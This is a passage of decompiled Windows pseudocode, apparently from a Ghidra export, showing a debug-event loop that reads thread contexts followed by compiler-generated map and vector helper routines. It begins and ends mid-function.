        BVar7 = GetThreadContext(local_6c._12_4_,&local_33c);
        if (BVar7 != 0) {
          local_34c = local_5c;
          ppiVar11 = FUN_0040cc24(param_1 + 7,&local_34c);
          pCVar15 = &local_33c;
          for (iVar14 = 0xb4; uVar6 = local_344, iVar14 != 0; iVar14 = iVar14 + -1) {
            *ppiVar11 = (int *)pCVar15->ContextFlags;
            pCVar15 = (CONTEXT *)&pCVar15->Dr0;
            ppiVar11 = ppiVar11 + 1;
          }
        }
      }
      else if (local_6c._0_4_ == 6) {
        puVar1 = (undefined4 *)param_1[3];
        puVar5 = (undefined4 *)puVar1[1];
        puVar13 = puVar1;
        while (puVar9 = puVar5, *(char *)((int)puVar9 + 0xd) == '\0') {
          if ((int *)puVar9[4] < local_5c) {
            puVar5 = (undefined4 *)puVar9[2];
          }
          else {
            puVar5 = (undefined4 *)*puVar9;
            puVar13 = puVar9;
          }
        }
        if ((puVar13 == puVar1) || (local_5c < (int *)puVar13[4])) {
          local_354 = puVar1;
          ppuVar10 = &local_354;
        }
        else {
          local_350 = puVar13;
          ppuVar10 = &local_350;
        }
        uVar6 = local_344;
        if (*ppuVar10 != puVar1) {
          piVar2 = (int *)(*ppuVar10)[8];
          local_348 = local_5c;
          ppiVar11 = FUN_0040cbaa(param_1 + 5,&local_348);
          *ppiVar11 = piVar4;
          ppiVar11[1] = piVar2;
          ppiVar11[2] = piVar3;
          ppiVar11[3] = (int *)0x0;
          uVar6 = local_344;
        }
      }
      if (local_33d != '\0') break;
      ContinueDebugEvent(local_6c._4_4_,local_6c._8_4_,0x10002);
    }
  } while (local_33d == '\0');
  pvVar12 = (void *)FUN_00416f82(0x60);
  if (pvVar12 != *param_1) {
    FID_conflict__free(*param_1);
    *param_1 = pvVar12;
  }
  FID_conflict__memcpy(*param_1,local_6c,0x60);
LAB_0040ca85:
  uVar16 = FUN_0041a954();
  return uVar16;
}



int __fastcall FUN_0040caf5(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  if ((*(int *)(param_1 + 0x2c) - *(int *)(param_1 + 0x28) & 0xfffffffcU) != 0) {
    do {
      iVar1 = (**(code **)(**(int **)(*(int *)(param_1 + 0x28) + iVar2 * 4) + 4))();
      if ((iVar1 != 0) && (iVar1 != 1)) {
        return iVar1;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 != *(int *)(param_1 + 0x2c) - *(int *)(param_1 + 0x28) >> 2);
  }
  return 0;
}



void __fastcall FUN_0040cb35(void **param_1)

{
  FUN_0040cff0(*(int **)((int)*param_1 + 4));
  *(void **)((int)*param_1 + 4) = *param_1;
  *(void **)*param_1 = *param_1;
  *(void **)((int)*param_1 + 8) = *param_1;
  param_1[1] = (void *)0x0;
  FID_conflict__free(*param_1);
  return;
}



void __thiscall FUN_0040cb5e(void *this,int *param_1,uint *param_2)

{
  uint *puVar1;
  uint uVar2;
  uint **ppuVar3;
  uint *puVar4;
  uint **ppuVar5;
  
                    // WARNING: Load size is inaccurate
  puVar1 = *this;
  ppuVar5 = (uint **)puVar1;
  if (*(char *)((int)(uint *)puVar1[1] + 0xd) == '\0') {
    ppuVar3 = (uint **)(uint *)puVar1[1];
    do {
      if (ppuVar3[4] < *param_2) {
        puVar4 = ppuVar3[2];
      }
      else {
        puVar4 = *ppuVar3;
        ppuVar5 = ppuVar3;
      }
      ppuVar3 = (uint **)puVar4;
    } while (*(char *)((int)puVar4 + 0xd) == '\0');
  }
  if ((ppuVar5 == (uint **)puVar1) ||
     (uVar2 = *param_2, param_2 = (uint *)ppuVar5, uVar2 < ppuVar5[4])) {
    param_2 = puVar1;
  }
  *param_1 = (int)param_2;
  return;
}



int ** __thiscall FUN_0040cbaa(void *this,int **param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int **ppiVar4;
  int **ppiVar5;
  
  ppiVar2 = param_1;
                    // WARNING: Load size is inaccurate
  ppiVar1 = *this;
  ppiVar5 = ppiVar1;
  if (*(char *)((int)ppiVar1[1] + 0xd) == '\0') {
    ppiVar4 = (int **)ppiVar1[1];
    do {
      if (ppiVar4[4] < *param_1) {
        ppiVar3 = (int **)ppiVar4[2];
      }
      else {
        ppiVar3 = (int **)*ppiVar4;
        ppiVar5 = ppiVar4;
      }
      ppiVar4 = ppiVar3;
    } while (*(char *)((int)ppiVar3 + 0xd) == '\0');
  }
  if ((ppiVar5 == ppiVar1) || (*param_1 < ppiVar5[4])) {
    ppiVar4 = (int **)FUN_0040d4bf((undefined4 *)this);
    ppiVar1 = ppiVar4 + 4;
    *(undefined2 *)(ppiVar4 + 3) = 0;
    if (ppiVar1 != (int **)0x0) {
      *ppiVar1 = *ppiVar2;
      ppiVar4[5] = (int *)0x0;
      ppiVar4[6] = (int *)0x0;
      ppiVar4[7] = (int *)0x0;
      ppiVar4[8] = (int *)0x0;
    }
    FUN_0040d18a(this,(int **)&param_1,ppiVar5,ppiVar1,ppiVar4);
    ppiVar5 = param_1;
  }
  return ppiVar5 + 5;
}



int ** __thiscall FUN_0040cc24(void *this,int **param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int **ppiVar4;
  
                    // WARNING: Load size is inaccurate
  ppiVar1 = *this;
  ppiVar4 = ppiVar1;
  if (*(char *)((int)ppiVar1[1] + 0xd) == '\0') {
    ppiVar3 = (int **)ppiVar1[1];
    do {
      if (ppiVar3[4] < *param_1) {
        ppiVar2 = (int **)ppiVar3[2];
      }
      else {
        ppiVar2 = (int **)*ppiVar3;
        ppiVar4 = ppiVar3;
      }
      ppiVar3 = ppiVar2;
    } while (*(char *)((int)ppiVar2 + 0xd) == '\0');
  }
  if ((ppiVar4 == ppiVar1) || (*param_1 < ppiVar4[4])) {
    ppiVar3 = (int **)FUN_0040d4f4((undefined4 *)this);
    ppiVar1 = ppiVar3 + 4;
    *(undefined2 *)(ppiVar3 + 3) = 0;
    if (ppiVar1 != (int **)0x0) {
      *ppiVar1 = *param_1;
      FUN_00416e80((uint *)(ppiVar3 + 5),0,0x2d0);
    }
    FUN_0040d28a(this,(int **)&param_1,ppiVar4,ppiVar1,ppiVar3);
    ppiVar4 = param_1;
  }
  return ppiVar4 + 5;
}



void __thiscall FUN_0040ccae(void *this,undefined4 *param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  
  puVar3 = *(undefined4 **)((int)this + 4);
                    // WARNING: Load size is inaccurate
  if ((param_1 < puVar3) && (*this < param_1 || *this == param_1)) {
                    // WARNING: Load size is inaccurate
    iVar1 = *this;
    if (puVar3 == *(undefined4 **)((int)this + 8)) {
      FUN_0040cd5e((void **)this);
    }
    puVar3 = *(undefined4 **)((int)this + 4);
    if (puVar3 == (undefined4 *)0x0) goto LAB_0040ccf7;
                    // WARNING: Load size is inaccurate
    uVar2 = *(undefined4 *)(*this + ((int)param_1 - iVar1 >> 2) * 4);
  }
  else {
    if (puVar3 == *(undefined4 **)((int)this + 8)) {
      FUN_0040cd5e((void **)this);
    }
    puVar3 = *(undefined4 **)((int)this + 4);
    if (puVar3 == (undefined4 *)0x0) goto LAB_0040ccf7;
    uVar2 = *param_1;
  }
  *puVar3 = uVar2;
LAB_0040ccf7:
  *(int *)((int)this + 4) = *(int *)((int)this + 4) + 4;
  return;
}



int ** __thiscall FUN_0040cd01(void *this,int **param_1)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  int **ppiVar4;
  int *local_8;
  
                    // WARNING: Load size is inaccurate
  ppiVar1 = *this;
  ppiVar3 = ppiVar1;
  if (*(char *)((int)ppiVar1[1] + 0xd) == '\0') {
    ppiVar2 = ppiVar1;
    ppiVar4 = (int **)ppiVar1[1];
    do {
      ppiVar3 = ppiVar4;
      if (ppiVar3[4] < *param_1) {
        ppiVar4 = (int **)ppiVar3[2];
        ppiVar3 = ppiVar2;
      }
      else {
        ppiVar4 = (int **)*ppiVar3;
      }
      ppiVar2 = ppiVar3;
    } while (*(char *)((int)ppiVar4 + 0xd) == '\0');
  }
  if ((ppiVar3 == ppiVar1) || (*param_1 < ppiVar3[4])) {
    local_8 = (int *)this;
    ppiVar3 = FUN_0040d025(this,&local_8,ppiVar3,&param_1,&param_1);
    ppiVar3 = (int **)*ppiVar3;
  }
  return ppiVar3 + 5;
}



void __fastcall FUN_0040cd5e(void **param_1)

{
  void *pvVar1;
  code *pcVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  
  pvVar1 = param_1[2];
  if ((int)pvVar1 - (int)param_1[1] >> 2 == 0) {
    iVar4 = (int)param_1[1] - (int)*param_1 >> 2;
    if (iVar4 == 0x3fffffff) {
      FUN_00422ea9(param_1,(short)pvVar1);
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    uVar5 = iVar4 + 1;
    uVar3 = (int)pvVar1 - (int)*param_1 >> 2;
    if (0x3fffffff - (uVar3 >> 1) < uVar3) {
      uVar3 = 0;
    }
    else {
      uVar3 = uVar3 + (uVar3 >> 1);
    }
    if (uVar3 < uVar5) {
      uVar3 = uVar5;
    }
    FUN_0040cedf(param_1,uVar3,uVar3);
  }
  return;
}



void __fastcall FUN_0040cdb7(void **param_1)

{
  uint uVar1;
  code *pcVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  
  if (((int)param_1[2] - (int)param_1[1]) / 0xc == 0) {
    iVar5 = (int)param_1[1] - (int)*param_1;
    iVar3 = iVar5 / 0xc;
    if (iVar3 == 0x15555555) {
      FUN_00422ea9(0,(short)(iVar5 % 0xc));
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    uVar1 = iVar3 + 1;
    uVar4 = ((int)param_1[2] - (int)*param_1) / 0xc;
    uVar6 = uVar4 >> 1;
    if (0x15555555 - uVar6 < uVar4) {
      uVar4 = 0;
    }
    else {
      uVar4 = uVar4 + uVar6;
    }
    if (uVar4 < uVar1) {
      uVar4 = uVar1;
    }
    FUN_0040cf54(param_1,uVar6,uVar4);
  }
  return;
}



int * __fastcall FUN_0040ce22(int *param_1)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  undefined8 uVar4;
  undefined4 uVar5;
  
  uVar5 = 0x30;
  *param_1 = 0;
  param_1[1] = 0;
  uVar4 = FUN_00416f82(0x30);
  iVar2 = (int)uVar4;
  if (iVar2 != 0) {
    *(int *)iVar2 = iVar2;
    if ((int *)(iVar2 + 4) != (int *)0x0) {
      *(int *)(iVar2 + 4) = iVar2;
    }
    if ((int *)(iVar2 + 8) != (int *)0x0) {
      *(int *)(iVar2 + 8) = iVar2;
    }
    *(undefined2 *)(iVar2 + 0xc) = 0x101;
    *param_1 = iVar2;
    return param_1;
  }
  FUN_00422e78(uVar5,(int)((ulonglong)uVar4 >> 0x20));
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



int * __fastcall FUN_0040ce60(int *param_1)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  undefined8 uVar4;
  undefined4 uVar5;
  
  uVar5 = 0x24;
  *param_1 = 0;
  param_1[1] = 0;
  uVar4 = FUN_00416f82(0x24);
  iVar2 = (int)uVar4;
  if (iVar2 != 0) {
    *(int *)iVar2 = iVar2;
    if ((int *)(iVar2 + 4) != (int *)0x0) {
      *(int *)(iVar2 + 4) = iVar2;
    }
    if ((int *)(iVar2 + 8) != (int *)0x0) {
      *(int *)(iVar2 + 8) = iVar2;
    }
    *(undefined2 *)(iVar2 + 0xc) = 0x101;
    *param_1 = iVar2;
    return param_1;
  }
  FUN_00422e78(uVar5,(int)((ulonglong)uVar4 >> 0x20));
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



int * __fastcall FUN_0040ce9e(int *param_1)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  undefined8 uVar4;
  undefined4 uVar5;
  
  uVar5 = 0x2e4;
  *param_1 = 0;
  param_1[1] = 0;
  uVar4 = FUN_00416f82(0x2e4);
  iVar2 = (int)uVar4;
  if (iVar2 != 0) {
    *(int *)iVar2 = iVar2;
    if ((int *)(iVar2 + 4) != (int *)0x0) {
      *(int *)(iVar2 + 4) = iVar2;
    }
    if ((int *)(iVar2 + 8) != (int *)0x0) {
      *(int *)(iVar2 + 8) = iVar2;
    }
    *(undefined2 *)(iVar2 + 0xc) = 0x101;
    *param_1 = iVar2;
    return param_1;
  }
  FUN_00422e78(uVar5,(int)((ulonglong)uVar4 >> 0x20));
  pcVar1 = (code *)swi(3);
  piVar3 = (int *)(*pcVar1)();
  return piVar3;
}



void __fastcall FUN_0040cedf(void **param_1,undefined4 param_2,uint param_3)

{
  void *pvVar1;
  void *pvVar2;
  code *pcVar3;
  void **ppvVar4;
  void *_Dst;
  undefined8 uVar5;
  
  _Dst = (void *)0x0;
  if (param_3 != 0) {
    ppvVar4 = param_1;
    if (param_3 < 0x40000000) {
      ppvVar4 = (void **)(param_3 << 2);
      uVar5 = FUN_00416f82((size_t)ppvVar4);
      param_2 = (undefined4)((ulonglong)uVar5 >> 0x20);
      _Dst = (void *)uVar5;
      if (_Dst != (void *)0x0) goto LAB_0040cf0a;
    }
    FUN_00422e78(ppvVar4,param_2);
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
LAB_0040cf0a:
  FID_conflict__memcpy(_Dst,*param_1,(int)param_1[1] - (int)*param_1 & 0xfffffffc);
  pvVar1 = param_1[1];
  pvVar2 = *param_1;
  if (*param_1 != (void *)0x0) {
    FID_conflict__free(*param_1);
  }
  *param_1 = _Dst;
  param_1[2] = (void *)((int)_Dst + param_3 * 4);
  param_1[1] = (void *)((int)_Dst + ((int)pvVar1 - (int)pvVar2 >> 2) * 4);
  return;
}



void __fastcall FUN_0040cf54(void **param_1,undefined4 param_2,uint param_3)

{
  undefined4 *puVar1;
  void *pvVar2;
  void *pvVar3;
  code *pcVar4;
  void **ppvVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined8 uVar9;
  
  puVar8 = (undefined4 *)0x0;
  if (param_3 != 0) {
    ppvVar5 = param_1;
    if (param_3 < 0x15555556) {
      ppvVar5 = (void **)(param_3 * 0xc);
      uVar9 = FUN_00416f82((size_t)ppvVar5);
      param_2 = (undefined4)((ulonglong)uVar9 >> 0x20);
      puVar8 = (undefined4 *)uVar9;
      if (puVar8 != (undefined4 *)0x0) goto LAB_0040cf82;
    }
    FUN_00422e78(ppvVar5,param_2);
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
LAB_0040cf82:
  puVar1 = (undefined4 *)param_1[1];
  puVar7 = puVar8;
  for (puVar6 = (undefined4 *)*param_1; puVar6 != puVar1; puVar6 = puVar6 + 3) {
    if (puVar7 != (undefined4 *)0x0) {
      *puVar7 = *puVar6;
      puVar7[1] = puVar6[1];
      puVar7[2] = puVar6[2];
    }
    puVar7 = puVar7 + 3;
  }
  pvVar2 = param_1[1];
  pvVar3 = *param_1;
  if (*param_1 != (void *)0x0) {
    FID_conflict__free(*param_1);
  }
  *param_1 = puVar8;
  param_1[2] = puVar8 + param_3 * 3;
  param_1[1] = puVar8 + (((int)pvVar2 - (int)pvVar3) / 0xc) * 3;
  return;
}



void FUN_0040cff0(int *param_1)

{
  char cVar1;
  int *piVar2;
  
  cVar1 = *(char *)((int)param_1 + 0xd);
  while (cVar1 == '\0') {
    FUN_0040cff0((int *)param_1[2]);
    piVar2 = (int *)*param_1;
    FID_conflict__free(param_1);
    param_1 = piVar2;
    cVar1 = *(char *)((int)piVar2 + 0xd);
  }
  return;
}



int ** __thiscall
FUN_0040d025(void *this,int **param_1,int **param_2,undefined4 param_3,undefined4 *param_4)

{
  int **ppiVar1;
  int *piVar2;
  code *pcVar3;
  int **ppiVar4;
  undefined4 uVar5;
  
  uVar5 = 0x18;
  ppiVar4 = (int **)FUN_00416f82(0x18);
  if (ppiVar4 != (int **)0x0) {
                    // WARNING: Load size is inaccurate
    *ppiVar4 = *this;
    if (ppiVar4 + 1 != (int **)0x0) {
                    // WARNING: Load size is inaccurate
      ppiVar4[1] = *this;
    }
    if (ppiVar4 + 2 != (int **)0x0) {
                    // WARNING: Load size is inaccurate
      ppiVar4[2] = *this;
    }
    ppiVar1 = ppiVar4 + 4;
    *(undefined2 *)(ppiVar4 + 3) = 0;
    if (ppiVar1 != (int **)0x0) {
      piVar2 = *(int **)*param_4;
      ppiVar4[5] = (int *)0x0;
      *ppiVar1 = piVar2;
    }
    FUN_0040d38a(this,param_1,param_2,ppiVar1,ppiVar4);
    return param_1;
  }
  FUN_00422e78(uVar5,0);
  pcVar3 = (code *)swi(3);
  ppiVar4 = (int **)(*pcVar3)();
  return ppiVar4;
}



int ** __thiscall FUN_0040d08a(void *this,int **param_1,int **param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  bool bVar4;
  char cVar5;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (*(int *)((int)this + 4) == 0) {
                    // WARNING: Load size is inaccurate
    FUN_0040d52c(this,param_1,'\x01',*this,this,param_4);
    return param_1;
  }
                    // WARNING: Load size is inaccurate
  ppiVar2 = *this;
  ppiVar3 = (int **)this;
  if (param_2 == (int **)*ppiVar2) {
    ppiVar2 = (int **)this;
    if (param_2[4] <= *param_3) goto LAB_0040d16a;
  }
  else {
    if (param_2 == ppiVar2) {
      ppiVar3 = (int **)ppiVar2[2];
      if (*param_3 <= ppiVar3[4]) goto LAB_0040d16a;
      cVar5 = '\0';
      ppiVar2 = ppiVar3;
      goto LAB_0040d15d;
    }
    bVar4 = param_2[4] < *param_3;
    if (bVar4 || param_2[4] == *param_3) {
LAB_0040d129:
      if (!bVar4) {
LAB_0040d16a:
        ppiVar2 = (int **)FUN_0040d653(this,local_10,ppiVar3,param_3,param_4);
        *param_1 = *ppiVar2;
        return param_1;
      }
      local_8 = param_2;
      ppiVar2 = FUN_00402ad4((int **)&local_8);
                    // WARNING: Load size is inaccurate
      if ((*ppiVar2 != *this) && (ppiVar3 = (int **)*param_3, local_8[4] <= ppiVar3))
      goto LAB_0040d16a;
      ppiVar2 = (int **)param_2[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = local_8;
      ppiVar3 = param_2;
    }
    else {
      local_8 = param_2;
      ppiVar2 = FUN_00409256((int **)&local_8);
      ppiVar3 = (int **)*param_3;
      if (ppiVar3 <= (int **)(*ppiVar2)[4]) {
        bVar4 = param_2[4] < ppiVar3;
        goto LAB_0040d129;
      }
      ppiVar2 = (int **)local_8[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = param_2;
      ppiVar3 = local_8;
    }
    param_2 = ppiVar1;
    if (cVar5 != '\0') {
      cVar5 = '\0';
      goto LAB_0040d15d;
    }
  }
  cVar5 = '\x01';
  ppiVar3 = param_2;
LAB_0040d15d:
  FUN_0040d52c(this,param_1,cVar5,ppiVar3,ppiVar2,param_4);
  return param_1;
}



int ** __thiscall FUN_0040d18a(void *this,int **param_1,int **param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  bool bVar4;
  char cVar5;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (*(int *)((int)this + 4) == 0) {
                    // WARNING: Load size is inaccurate
    FUN_0040d6f4(this,param_1,'\x01',*this,this,param_4);
    return param_1;
  }
                    // WARNING: Load size is inaccurate
  ppiVar2 = *this;
  ppiVar3 = (int **)this;
  if (param_2 == (int **)*ppiVar2) {
    ppiVar2 = (int **)this;
    if (param_2[4] <= *param_3) goto LAB_0040d26a;
  }
  else {
    if (param_2 == ppiVar2) {
      ppiVar3 = (int **)ppiVar2[2];
      if (*param_3 <= ppiVar3[4]) goto LAB_0040d26a;
      cVar5 = '\0';
      ppiVar2 = ppiVar3;
      goto LAB_0040d25d;
    }
    bVar4 = param_2[4] < *param_3;
    if (bVar4 || param_2[4] == *param_3) {
LAB_0040d229:
      if (!bVar4) {
LAB_0040d26a:
        ppiVar2 = (int **)FUN_0040d81b(this,local_10,ppiVar3,param_3,param_4);
        *param_1 = *ppiVar2;
        return param_1;
      }
      local_8 = param_2;
      ppiVar2 = FUN_00402ad4((int **)&local_8);
                    // WARNING: Load size is inaccurate
      if ((*ppiVar2 != *this) && (ppiVar3 = (int **)*param_3, local_8[4] <= ppiVar3))
      goto LAB_0040d26a;
      ppiVar2 = (int **)param_2[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = local_8;
      ppiVar3 = param_2;
    }
    else {
      local_8 = param_2;
      ppiVar2 = FUN_00409256((int **)&local_8);
      ppiVar3 = (int **)*param_3;
      if (ppiVar3 <= (int **)(*ppiVar2)[4]) {
        bVar4 = param_2[4] < ppiVar3;
        goto LAB_0040d229;
      }
      ppiVar2 = (int **)local_8[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = param_2;
      ppiVar3 = local_8;
    }
    param_2 = ppiVar1;
    if (cVar5 != '\0') {
      cVar5 = '\0';
      goto LAB_0040d25d;
    }
  }
  cVar5 = '\x01';
  ppiVar3 = param_2;
LAB_0040d25d:
  FUN_0040d6f4(this,param_1,cVar5,ppiVar3,ppiVar2,param_4);
  return param_1;
}



int ** __thiscall FUN_0040d28a(void *this,int **param_1,int **param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  bool bVar4;
  char cVar5;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (*(int *)((int)this + 4) == 0) {
                    // WARNING: Load size is inaccurate
    FUN_0040d8bc(this,param_1,'\x01',*this,this,param_4);
    return param_1;
  }
                    // WARNING: Load size is inaccurate
  ppiVar2 = *this;
  ppiVar3 = (int **)this;
  if (param_2 == (int **)*ppiVar2) {
    ppiVar2 = (int **)this;
    if (param_2[4] <= *param_3) goto LAB_0040d36a;
  }
  else {
    if (param_2 == ppiVar2) {
      ppiVar3 = (int **)ppiVar2[2];
      if (*param_3 <= ppiVar3[4]) goto LAB_0040d36a;
      cVar5 = '\0';
      ppiVar2 = ppiVar3;
      goto LAB_0040d35d;
    }
    bVar4 = param_2[4] < *param_3;
    if (bVar4 || param_2[4] == *param_3) {
LAB_0040d329:
      if (!bVar4) {
LAB_0040d36a:
        ppiVar2 = (int **)FUN_0040d9e3(this,local_10,ppiVar3,param_3,param_4);
        *param_1 = *ppiVar2;
        return param_1;
      }
      local_8 = param_2;
      ppiVar2 = FUN_00402ad4((int **)&local_8);
                    // WARNING: Load size is inaccurate
      if ((*ppiVar2 != *this) && (ppiVar3 = (int **)*param_3, local_8[4] <= ppiVar3))
      goto LAB_0040d36a;
      ppiVar2 = (int **)param_2[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = local_8;
      ppiVar3 = param_2;
    }
    else {
      local_8 = param_2;
      ppiVar2 = FUN_00409256((int **)&local_8);
      ppiVar3 = (int **)*param_3;
      if (ppiVar3 <= (int **)(*ppiVar2)[4]) {
        bVar4 = param_2[4] < ppiVar3;
        goto LAB_0040d329;
      }
      ppiVar2 = (int **)local_8[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = param_2;
      ppiVar3 = local_8;
    }
    param_2 = ppiVar1;
    if (cVar5 != '\0') {
      cVar5 = '\0';
      goto LAB_0040d35d;
    }
  }
  cVar5 = '\x01';
  ppiVar3 = param_2;
LAB_0040d35d:
  FUN_0040d8bc(this,param_1,cVar5,ppiVar3,ppiVar2,param_4);
  return param_1;
}



int ** __thiscall FUN_0040d38a(void *this,int **param_1,int **param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  bool bVar4;
  char cVar5;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (*(int *)((int)this + 4) == 0) {
                    // WARNING: Load size is inaccurate
    FUN_0040da84(this,param_1,'\x01',*this,this,param_4);
    return param_1;
  }
                    // WARNING: Load size is inaccurate
  ppiVar2 = *this;
  ppiVar3 = (int **)this;
  if (param_2 == (int **)*ppiVar2) {
    ppiVar2 = (int **)this;
    if (param_2[4] <= *param_3) goto LAB_0040d46a;
  }
  else {
    if (param_2 == ppiVar2) {
      ppiVar3 = (int **)ppiVar2[2];
      if (*param_3 <= ppiVar3[4]) goto LAB_0040d46a;
      cVar5 = '\0';
      ppiVar2 = ppiVar3;
      goto LAB_0040d45d;
    }
    bVar4 = param_2[4] < *param_3;
    if (bVar4 || param_2[4] == *param_3) {
LAB_0040d429:
      if (!bVar4) {
LAB_0040d46a:
        ppiVar2 = (int **)FUN_0040dbab(this,local_10,ppiVar3,param_3,param_4);
        *param_1 = *ppiVar2;
        return param_1;
      }
      local_8 = param_2;
      ppiVar2 = FUN_00402ad4((int **)&local_8);
                    // WARNING: Load size is inaccurate
      if ((*ppiVar2 != *this) && (ppiVar3 = (int **)*param_3, local_8[4] <= ppiVar3))
      goto LAB_0040d46a;
      ppiVar2 = (int **)param_2[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = local_8;
      ppiVar3 = param_2;
    }
    else {
      local_8 = param_2;
      ppiVar2 = FUN_00409256((int **)&local_8);
      ppiVar3 = (int **)*param_3;
      if (ppiVar3 <= (int **)(*ppiVar2)[4]) {
        bVar4 = param_2[4] < ppiVar3;
        goto LAB_0040d429;
      }
      ppiVar2 = (int **)local_8[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = param_2;
      ppiVar3 = local_8;
    }
    param_2 = ppiVar1;
    if (cVar5 != '\0') {
      cVar5 = '\0';
      goto LAB_0040d45d;
    }
  }
  cVar5 = '\x01';
  ppiVar3 = param_2;
LAB_0040d45d:
  FUN_0040da84(this,param_1,cVar5,ppiVar3,ppiVar2,param_4);
  return param_1;
}



undefined4 * __fastcall FUN_0040d48a(undefined4 *param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  uVar3 = 0x30;
  puVar2 = (undefined4 *)FUN_00416f82(0x30);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    if (puVar2 + 1 != (undefined4 *)0x0) {
      puVar2[1] = *param_1;
    }
    if (puVar2 + 2 != (undefined4 *)0x0) {
      puVar2[2] = *param_1;
    }
    return puVar2;
  }
  FUN_00422e78(uVar3,0);
  pcVar1 = (code *)swi(3);
  puVar2 = (undefined4 *)(*pcVar1)();
  return puVar2;
}



undefined4 * __fastcall FUN_0040d4bf(undefined4 *param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  uVar3 = 0x24;
  puVar2 = (undefined4 *)FUN_00416f82(0x24);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    if (puVar2 + 1 != (undefined4 *)0x0) {
      puVar2[1] = *param_1;
    }
    if (puVar2 + 2 != (undefined4 *)0x0) {
      puVar2[2] = *param_1;
    }
    return puVar2;
  }
  FUN_00422e78(uVar3,0);
  pcVar1 = (code *)swi(3);
  puVar2 = (undefined4 *)(*pcVar1)();
  return puVar2;
}



undefined4 * __fastcall FUN_0040d4f4(undefined4 *param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  uVar3 = 0x2e4;
  puVar2 = (undefined4 *)FUN_00416f82(0x2e4);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    if (puVar2 + 1 != (undefined4 *)0x0) {
      puVar2[1] = *param_1;
    }
    if (puVar2 + 2 != (undefined4 *)0x0) {
      puVar2[2] = *param_1;
    }
    return puVar2;
  }
  FUN_00422e78(uVar3,0);
  pcVar1 = (code *)swi(3);
  puVar2 = (undefined4 *)(*pcVar1)();
  return puVar2;
}



void __thiscall
FUN_0040d52c(void *this,int **param_1,char param_2,int **param_3,undefined4 param_4,int **param_5)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  int **ppiVar4;
  
  if (0x5555553 < *(uint *)((int)this + 4)) {
    FID_conflict__free(param_5);
    FUN_00422ea9(extraout_ECX,extraout_DX);
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  *(uint *)((int)this + 4) = *(uint *)((int)this + 4) + 1;
  param_5[1] = (int *)param_3;
                    // WARNING: Load size is inaccurate
  if (param_3 == *this) {
    (*this)[1] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    **this = param_5;
                    // WARNING: Load size is inaccurate
    *(int ***)(*this + 8) = param_5;
  }
  else if (param_2 == '\0') {
    param_3[2] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == *(int ***)(*this + 8)) {
      *(int ***)(*this + 8) = param_5;
    }
  }
  else {
    *param_3 = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == (int **)**this) {
      **this = (int)param_5;
    }
  }
  piVar3 = param_5[1];
  ppiVar4 = param_5;
  do {
    if (*(char *)(piVar3 + 3) != '\0') {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*(int *)(*this + 4) + 0xc) = 1;
      *param_1 = (int *)param_5;
      return;
    }
    ppiVar1 = (int **)ppiVar4[1];
    piVar3 = (int *)*ppiVar1[1];
    if (ppiVar1 == (int **)piVar3) {
      piVar3 = (int *)ppiVar1[1][2];
      if (*(char *)(piVar3 + 3) == '\0') {
LAB_0040d5d6:
        *(undefined *)(ppiVar1 + 3) = 1;
        *(undefined *)(piVar3 + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
